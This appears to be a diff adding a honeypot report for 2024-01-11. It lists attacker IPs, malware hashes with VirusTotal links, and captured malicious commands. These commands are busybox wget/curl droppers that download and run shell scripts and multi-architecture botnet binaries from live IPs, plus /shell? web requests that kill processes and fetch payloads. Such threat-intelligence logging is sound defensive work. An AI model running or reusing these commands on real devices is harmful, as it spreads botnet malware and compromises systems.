@@ -1,0 +1,37 @@
+Top 5 IPs for 2024-01-11:
+
+92.222.25.127
+121.4.195.240
+167.71.247.74
+101.43.54.155
+220.72.182.252
+
+Malware downloaded:
+454c219bc7696089e04f27f726f36e12f5f177f4cac9dfddf75c0cbf4b7c33da
+https://www.virustotal.com/gui/file/454c219bc7696089e04f27f726f36e12f5f177f4cac9dfddf75c0cbf4b7c33da
+a7f70905ccac5835999b755023c880606681329c1c52f20ec20b801c3c0ad116
+https://www.virustotal.com/gui/file/a7f70905ccac5835999b755023c880606681329c1c52f20ec20b801c3c0ad116
+
+Malicious commands seen:
+cd /data/local/tmp/; busybox wget http://91.92.253.56/w.sh; sh w.sh; curl http://91.92.253.56/c.sh; sh c.sh
+cd /data/local/tmp/;busybox wget http://103.245.236.109/w.sh; sh w.sh; curl http://103.245.236.109/c.sh; sh c.sh; wget http://103.245.236.109/wget.sh; sh wget.sh; curl http://103.245.236.109/wget.sh; sh wget.sh; busybox wget http://103.245.236.109/wget.sh; sh wget.sh; busybox curl http://103.245.236.109/wget.sh; sh wget.sh
+
+busybox wget http://91.92.253.56/bins/arm; chmod 777 arm; ./arm android
+busybox wget http://91.92.253.56/bins/arm5; chmod 777 arm5; ./arm5 android
+busybox wget http://91.92.253.56/bins/arm6; chmod 777 arm6; ./arm6 android
+busybox wget http://91.92.253.56/bins/arm7; chmod 777 arm7; ./arm7 android
+busybox wget http://91.92.253.56/bins/m68k; chmod 777 m68k; ./m68k android
+busybox wget http://1.1.1.1/mips; chmod 777 mips; ./mips android
+busybox wget http://91.92.253.56/bins/mpsl; chmod 777 mpsl; ./mpsl android
+busybox wget http://91.92.253.56/bins/ppc; chmod 777 ppc; ./ppc android
+busybox wget http://91.92.253.56/bins/arc; chmod 777 arc; ./arc android
+busybox wget http://91.92.253.56/bins/sh4; chmod 777 sh4; ./sh4 android
+busybox wget http://91.92.253.56/bins/spc; chmod 777 spc; ./spc android
+busybox wget http://91.92.253.56/bins/x86; chmod 777 x86; ./x86 android
+busybox wget http://91.92.253.56/bins/x86_64; chmod 777 x86_64; ./x86_64 android
+rm $0
+
+
+/shell?cd+/tmp;rm+popbang.arm4+popbang.arm7;wget+http:/\\/37.221.94.56/popbang.arm7;chmod+777+popbang.arm7;./popbang.arm7+tacos;wget+http:/\\/37.221.94.56/popbang.arm4;chmod+777+popbang.arm4;./popbang.arm4+tacos
+
+/shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+arm4+arm7;wget+http:/\\/89.190.156.211/arm7;chmod+777+arm7;./arm7+jaws;wget+http:/\\/89.190.156.211/arm4;chmod+777+arm4;./arm4+jaws
